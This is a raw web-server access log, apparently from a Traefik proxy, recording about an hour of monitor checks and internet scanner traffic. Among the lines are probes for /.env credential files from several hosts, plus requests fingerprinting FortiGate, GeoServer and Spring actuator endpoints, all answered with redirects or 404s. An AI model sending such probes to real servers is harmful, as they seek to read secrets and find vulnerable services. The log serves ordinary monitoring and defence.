159.203.109.206 - - [18/Dec/2023:01:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3103 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3104 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:01:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3105 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3106 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3107 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:01:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3108 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3109 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3110 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3111 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3112 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:01:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3113 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3114 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:46:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3115 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3116 "www@docker" "http://172.18.0.9:80" 0ms
57.129.23.166 - - [18/Dec/2023:01:46:43 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 3117 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [18/Dec/2023:01:46:43 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 3118 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:01:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3119 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3120 "www@docker" "http://172.18.0.9:80" 0ms
91.92.243.232 - - [18/Dec/2023:01:47:57 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3121 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:01:48:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3122 "www@docker" "http://172.18.0.9:80" 0ms
54.37.79.75 - - [18/Dec/2023:01:48:33 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 3123 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [18/Dec/2023:01:48:33 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 3124 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [18/Dec/2023:01:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3125 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:49:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3126 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3127 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:50:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3128 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:01:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3129 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:51:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3130 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3131 "www@docker" "http://172.18.0.9:80" 0ms
45.33.87.154 - - [18/Dec/2023:01:52:16 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3132 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:01:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3133 "www@docker" "http://172.18.0.9:80" 1ms
172.104.11.34 - - [18/Dec/2023:01:52:27 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3134 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:01:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3135 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3136 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3137 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3138 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3139 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3140 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3141 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:01:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3142 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3143 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3144 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3145 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:01:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3146 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:01:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3147 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3148 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3149 "www@docker" "http://172.18.0.9:80" 0ms
162.216.149.173 - - [18/Dec/2023:02:00:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3150 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:02:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3151 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:02:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3152 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3153 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:02:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3154 "www@docker" "http://172.18.0.9:80" 0ms
2.56.247.167 - - [18/Dec/2023:02:02:13 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3155 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:02:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3156 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3157 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3158 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3159 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3160 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3161 "www@docker" "http://172.18.0.9:80" 0ms
107.170.240.57 - - [18/Dec/2023:02:04:41 +0000] "GET /actuator/health HTTP/1.1" 404 19 "-" "-" 3162 "-" "-" 0ms
34.77.127.183 - - [18/Dec/2023:02:04:51 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3163 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:02:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3164 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3165 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3166 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3167 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3168 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3169 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:02:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3170 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3171 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3172 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3173 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3174 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3175 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3176 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3177 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3178 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3179 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [18/Dec/2023:02:12:44 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3180 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:02:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3181 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3182 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3183 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3184 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3185 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:02:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3186 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3187 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3188 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3189 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3190 "www@docker" "http://172.18.0.9:80" 1ms
143.198.85.59 - - [18/Dec/2023:02:18:06 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3191 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:02:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3192 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:02:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3193 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:02:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3194 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3195 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [18/Dec/2023:02:20:18 +0000] "GET /trace/ HTTP/2.0" 200 6032 "-" "-" 3196 "livetrace@docker" "http://172.18.0.3:80" 43ms
173.48.140.140 - - [18/Dec/2023:02:20:18 +0000] "GET /trace/styles.css?version=0.8 HTTP/2.0" 304 0 "-" "-" 3197 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:02:20:20 +0000] "GET /trace/ HTTP/2.0" 200 6032 "-" "-" 3198 "livetrace@docker" "http://172.18.0.3:80" 5ms
159.203.109.206 - - [18/Dec/2023:02:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3199 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [18/Dec/2023:02:20:30 +0000] "GET /trace/ HTTP/2.0" 200 6032 "-" "-" 3200 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [18/Dec/2023:02:20:35 +0000] "GET /trace/ HTTP/2.0" 200 6032 "-" "-" 3201 "livetrace@docker" "http://172.18.0.3:80" 4ms
167.71.120.76 - - [18/Dec/2023:02:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3202 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [18/Dec/2023:02:20:37 +0000] "GET /trace/ HTTP/2.0" 200 6032 "-" "-" 3203 "livetrace@docker" "http://172.18.0.3:80" 4ms
159.203.109.206 - - [18/Dec/2023:02:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3204 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3205 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3206 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3207 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [18/Dec/2023:02:22:55 +0000] "GET /trace/ HTTP/2.0" 200 6032 "-" "-" 3208 "livetrace@docker" "http://172.18.0.3:80" 3ms
173.48.140.140 - - [18/Dec/2023:02:22:56 +0000] "GET /trace/ HTTP/2.0" 200 6032 "-" "-" 3209 "livetrace@docker" "http://172.18.0.3:80" 4ms
159.203.109.206 - - [18/Dec/2023:02:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3210 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3211 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3212 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3213 "www@docker" "http://172.18.0.9:80" 0ms
64.62.197.45 - - [18/Dec/2023:02:25:05 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3214 "-" "-" 0ms
148.153.45.238 - - [18/Dec/2023:02:25:21 +0000] "GET /9ZWr HTTP/1.1" 404 19 "-" "-" 3215 "-" "-" 0ms
148.153.45.238 - - [18/Dec/2023:02:25:21 +0000] "GET /Y1hk HTTP/1.1" 404 19 "-" "-" 3216 "-" "-" 0ms
148.153.45.238 - - [18/Dec/2023:02:25:21 +0000] "GET /aab8 HTTP/1.1" 404 19 "-" "-" 3217 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:02:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3218 "www@docker" "http://172.18.0.9:80" 0ms
148.153.45.238 - - [18/Dec/2023:02:25:23 +0000] "GET /jquery-3.3.1.slim.min.js HTTP/1.1" 404 19 "-" "-" 3219 "-" "-" 0ms
148.153.45.238 - - [18/Dec/2023:02:25:24 +0000] "GET /aab9 HTTP/1.1" 404 19 "-" "-" 3220 "-" "-" 0ms
148.153.45.238 - - [18/Dec/2023:02:25:25 +0000] "GET /jquery-3.3.2.slim.min.js HTTP/1.1" 404 19 "-" "-" 3221 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:02:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3222 "www@docker" "http://172.18.0.9:80" 0ms
64.62.197.42 - - [18/Dec/2023:02:26:15 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 3223 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:02:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3224 "www@docker" "http://172.18.0.9:80" 0ms
64.62.197.45 - - [18/Dec/2023:02:26:23 +0000] "GET /dns-query?name=dnsscan.shadowserver.org&type=A HTTP/1.1" 404 19 "-" "-" 3225 "-" "-" 0ms
64.62.197.40 - - [18/Dec/2023:02:26:28 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3226 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:02:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3227 "www@docker" "http://172.18.0.9:80" 1ms
64.62.197.45 - - [18/Dec/2023:02:26:44 +0000] "GET /api/v2/static/not.found HTTP/1.1" 404 19 "-" "-" 3228 "-" "-" 0ms
64.62.197.36 - - [18/Dec/2023:02:26:50 +0000] "GET /remote/logincheck HTTP/1.1" 404 19 "-" "-" 3229 "-" "-" 0ms
64.62.197.44 - - [18/Dec/2023:02:27:04 +0000] "GET /geoserver/web/ HTTP/1.1" 404 19 "-" "-" 3230 "-" "-" 0ms
95.214.235.169 - - [18/Dec/2023:02:27:16 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 3231 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [18/Dec/2023:02:27:16 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 3232 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:02:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3233 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3234 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:02:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3235 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:02:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3236 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3237 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:02:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3238 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3239 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3240 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:02:31:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3241 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3242 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3243 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3244 "www@docker" "http://172.18.0.9:80" 1ms
172.203.187.48 - - [18/Dec/2023:02:33:08 +0000] "GET //.env HTTP/1.1" 301 17 "-" "-" 3245 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:02:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3246 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3247 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3248 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3249 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3250 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3251 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:02:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3252 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3253 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3254 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3255 "www@docker" "http://172.18.0.9:80" 0ms
54.37.79.75 - - [18/Dec/2023:02:37:41 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 3256 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [18/Dec/2023:02:37:41 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 3257 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:02:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3258 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3259 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3260 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:02:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3261 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3262 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:02:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3263 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3264 "www@docker" "http://172.18.0.9:80" 0ms
68.69.186.30 - - [18/Dec/2023:02:41:29 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3265 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [18/Dec/2023:02:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3266 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:02:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3267 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:02:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3268 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3269 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3270 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3271 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3272 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:02:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3273 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3274 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:02:46:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3275 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3276 "www@docker" "http://172.18.0.9:80" 1ms
65.49.20.67 - - [18/Dec/2023:02:47:21 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3277 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:02:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3278 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3279 "www@docker" "http://172.18.0.9:80" 0ms
95.214.235.169 - - [18/Dec/2023:02:47:42 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 3280 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [18/Dec/2023:02:47:42 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 3281 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [18/Dec/2023:02:48:04 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 3282 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [18/Dec/2023:02:48:05 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 3283 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:02:48:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3284 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:02:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3285 "www@docker" "http://172.18.0.9:80" 1ms
65.49.20.67 - - [18/Dec/2023:02:48:38 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3286 "web-to-websecure@internal" "-" 0ms
